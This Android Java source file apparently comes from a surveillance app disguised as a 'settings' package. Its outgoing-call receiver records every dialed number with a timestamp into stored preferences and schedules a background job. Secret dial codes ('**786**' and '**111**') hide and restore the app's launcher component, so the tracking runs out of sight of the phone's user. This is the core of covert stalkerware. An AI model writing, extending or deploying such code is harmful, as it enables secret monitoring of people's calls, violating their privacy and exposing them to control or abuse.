package com.example.settings;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import static com.example.settings.MainActivity.setuponetimeworkManager;
import static com.example.settings.Utils.getDateTime;

import androidx.room.util.StringUtil;

import org.apache.commons.lang3.StringUtils;

public class OutgoingReceiver extends BroadcastReceiver {
    Sharedpref mSharedpref;
    @Override
    public void onReceive(Context context, Intent intent) {
        mSharedpref = new Sharedpref(context);
        String phoneNubmer = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if (!StringUtils.isBlank(phoneNubmer)) {
            if (phoneNubmer.equals("**786**")) {
                PackageManager p = context.getPackageManager();
                ComponentName componentName = new ComponentName(context, MainActivity.class);
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            } else if (phoneNubmer.equals("**111**")) {
                ComponentName componentToEnable = new ComponentName(context.getApplicationContext(), MainActivity.class);
                PackageManager pm = context.getApplicationContext().getPackageManager();
                pm.setComponentEnabledSetting(componentToEnable, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            } else {

                String lastentry = mSharedpref.getOutgoingNumbers();
                String mBuilder = lastentry + "{ Date: " + getDateTime() + ",Number: " + phoneNubmer + "}+\n+";
                mSharedpref.setOutgoingNumbers(mBuilder.toString());
                mSharedpref.commit();
                Log.d("Outgoing Numbers", mBuilder.toString());

            }
            setuponetimeworkManager("From OutGoing Call");
        }
    }
}
